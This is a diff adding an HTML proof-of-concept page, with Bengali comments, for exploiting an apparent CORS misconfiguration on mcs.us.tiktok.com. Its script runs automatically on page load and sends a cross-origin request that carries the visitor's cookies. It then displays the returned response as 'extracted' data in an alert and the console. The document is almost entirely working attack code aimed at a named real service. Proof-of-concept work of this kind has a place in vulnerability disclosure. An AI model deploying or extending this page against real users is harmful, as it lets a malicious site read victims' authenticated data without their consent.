@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h2>CORS Misconfiguration Proof of Concept</h2>
+    <p>Attempting to extract sensitive data from mcs.us.tiktok.com...</p>
+
+    <script>
+        // যে এন্ডপয়েন্টটিতে আমরা CORS মিসকনফিগারেশন পেয়েছি
+        const targetUrl = "https://mcs.us.tiktok.com/";
+
+        function exploit() {
+            var req = new XMLHttpRequest();
+            
+            // রিকোয়েস্ট ওপেন করছি
+            req.open("GET", targetUrl, true);
+            
+            // এটিই সবচেয়ে গুরুত্বপূর্ণ লাইন: এটি ব্রাউজারকে বাধ্য করে ইউজারের কুকি সাথে পাঠাতে
+            req.withCredentials = true; 
+            
+            req.onload = function() {
+                if (req.status === 200) {
+                    // সফল হলে রেসপন্সটি পপআপে দেখাবে
+                    alert("Data Extracted Successfully:\n\n" + this.responseText);
+                    console.log("Extracted Data:", this.responseText);
+                } else {
+                    // ফেইল করলে স্ট্যাটাস কোড দেখাবে
+                    alert("Failed to extract data. Status: " + req.status);
+                }
+            };
+            
+            req.onerror = function() {
+                // CORS পলিসি বা নেটওয়ার্ক এরর হলে এখানে আসবে
+                alert("Request failed! The CORS policy might be blocking the request or credentials are not being sent.");
+            };
+            
+            req.send();
+        }
+
+        // পেজ লোড হওয়ার পর স্বয়ংক্রিয়ভাবে এক্সপ্লয়েট রান করবে
+        window.onload = exploit;
+    </script>
+</body>
+</html>
